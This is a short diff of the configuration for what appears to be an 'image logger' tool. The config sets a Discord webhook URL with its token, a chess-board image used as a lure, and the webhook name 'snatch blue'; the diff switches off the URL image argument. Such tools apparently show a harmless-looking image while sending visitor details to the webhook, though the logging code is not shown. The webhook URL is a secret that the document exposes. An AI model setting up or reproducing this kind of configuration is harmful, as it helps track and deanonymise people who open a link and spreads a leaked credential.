@@ -17,7 +17,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1523600445824827403/BnbY7nEx9vPmba66zrgR8QfGDyU_iWHLKVveAhxVgWKCc9aRfd5aNRDtjQBDB6LZUh_A",
     "image": "https://media.gettyimages.com/id/644106662/photo/chess-board.jpg?s=612x612&w=0&k=20&c=nVEI9j-sBrJGyPmLAoj0zN80koEvPbIf_nUlhLnkNXQ=", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "snatch blue", # Set this to the name you want the webhook to have
